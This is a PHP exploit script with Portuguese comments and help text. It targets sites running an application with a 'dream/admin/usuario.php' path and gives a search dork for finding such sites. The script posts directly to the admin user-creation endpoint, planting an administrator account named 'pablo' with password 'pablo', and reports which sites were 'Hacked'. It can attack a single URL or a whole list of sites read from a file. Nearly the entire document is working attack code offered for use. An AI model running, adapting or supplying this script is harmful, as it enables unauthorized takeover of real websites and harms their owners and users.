<?php
	
	/*
  
		[+] Criado By Pablo Santhus
		[+] Exploit CSRF
		[+] Dork: inurl:dream/album.php
		[+] Salves: K4N3CK1@CR4CK3R, MaxNews, Ariel KraZynho, Mente Corrosiva, Fruidz
	
	*/


	error_reporting(0);
	set_time_limit(0);

	function banner(){

		echo "
			 (                         (                                      
	 )\ )          )  (        )\ )                 )    )            
	(()/(    )  ( /(  )\      (()/(    )         ( /( ( /(    (       
	 /(_))( /(  )\())((_) (    /(_))( /(   (     )\()))\())  ))\  (   
	(_))  )(_))((_)\  _   )\  (_))  )(_))  )\ ) (_))/((_)\  /((_) )\  
	| _ \((_)_ | |(_)| | ((_) / __|((_)_  _(_/( | |_ | |(_)(_))( ((_) 
	|  _// _` || '_ \| |/ _ \ \__ \/ _` || ' \))|  _|| ' \ | || |(_-< 
	|_|  \__,_||_.__/|_|\___/ |___/\__,_||_||_|  \__||_||_| \_,_|/__/ 
	                                                                  
	[+] Criado Por Pablo Santhus
	[+] PHP
	[+] Exploit > CSRF
	[+] Dork: inurl:dream/album.php
	[+] Ajuda: php CSRF.php -h
\n";

	}

	
	banner();
	if(isset($argv[2]) && $argv[1] == "-u"){
		$web = $argv[2] . "/";
		$complemento = "dream/admin/usuario.php?action=incluir";

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $web.$complemento);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS,  "user_login=pablo&user_password=pablo&Add-Admin");
		curl_setopt($ch, CURLOPT_USERAGENT, "");
		$exec = curl_exec($ch);
		if(strstr($exec, "Login")){
			echo "[+] Hacked > user: pablo password: pablo >> {$web}/dream/admin/login.php\n";
		}else{
			echo "[-] Not Hacked >> {$web}\n";
		}

	}

	if(isset($argv[2]) && $argv[1] == "-url"){
		$web = $argv[2];
		$ww = file($web);
		
		foreach($ww as $webs){
			$webs = str_replace("\r", "", $webs);
			$webs = str_replace("\n", "", $webs);

			$complemento = "/dream/admin/usuario.php?action=incluir";

			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $webs.$complemento);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS,  "user_login=pablo&user_password=pablo&Add-Admin");
			curl_setopt($ch, CURLOPT_USERAGENT, "");
			$exec = curl_exec($ch);
			if(strstr($exec, "Login")){
				echo "[+] Hacked > user: pablo password: pablo >> Login {$webs}/dream/admin/login.php\n";
			}else{
				echo "[-] Not Hacked >> {$webs}\n";
			}
									
		}
	}

	if($argv[1] == "-h" or $argv[1] == "-help"){
		print "\n\n-------------------------------------------------------------------\n";
		print "HELP: ";
		echo "\n
	options[-u, -url, -h]

	-u 		Apenas um site a ser explorado.
	-url 		Mais de um site a ser explorado.
	-h 		Painel de ajuda.

	exemplos:

	php CSRF.php -u http://www.pablo.com/
	php CSRF.php -url sites.txt

		";
		print "\n-------------------------------------------------------------------\n";
	}

?>
